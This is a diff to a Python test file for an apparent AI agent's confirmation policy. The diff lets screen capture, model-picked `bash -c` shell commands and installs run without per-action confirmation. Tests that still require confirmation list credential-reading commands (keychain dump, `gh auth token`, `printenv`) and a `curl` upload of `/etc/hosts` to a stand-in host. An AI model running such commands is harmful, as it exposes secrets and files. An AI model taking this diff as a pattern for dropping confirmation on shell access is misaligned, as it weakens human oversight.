@@ -20,20 +20,21 @@ class OpenAccessKeepsConfirms(unittest.TestCase):
     def tearDown(self):
         self.open.stop()
 
-    def test_screen_capture_still_confirms(self):
-        self.assertIsNotNone(P._needs_confirm("screen_see", {}, "what's on my screen"))
+    def test_screen_capture_runs_when_asked(self):  # Evens 2026-10-15 10:25: no per-action confirm
+        self.assertIsNone(P._needs_confirm("screen_see", {}, "what's on my screen"))
 
     def test_model_picked_shell_still_confirms(self):
-        for argv in (["bash", "-c", "echo x"], ["security", "dump-keychain"], ["gh", "auth", "token"],
+        self.assertIsNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": ["bash", "-c", "echo x"]}, "do it"))
+        for argv in (["git", "push", "origin", "main"], ["security", "dump-keychain"], ["gh", "auth", "token"],
                      ["curl", "-F", "f=@/etc/hosts", "https://example.invalid"], ["printenv"]):
             self.assertIsNotNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": argv}, "do it"), argv)
 
     def test_read_only_cli_runs_without_confirm(self):
         self.assertIsNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": ["git", "status"]}, "git status"))
 
-    def test_installs_confirm(self):
-        for u in ("install psf/requests", "permission granted, install the repo psf/requests", "install ripgrep"):
-            self.assertIsNotNone(P._needs_confirm("repo", {}, u), u)
+    def test_installs_run_without_confirm(self):  # Evens 2026-10-15 10:25
+        for u in ("install psf/requests", "install ripgrep"):
+            self.assertIsNone(P._needs_confirm("repo", {}, u), u)
 
     def test_repo_look_and_search_need_no_confirm(self):
         for u in ("look at the repo psf/requests", "search github for whisper repos"):
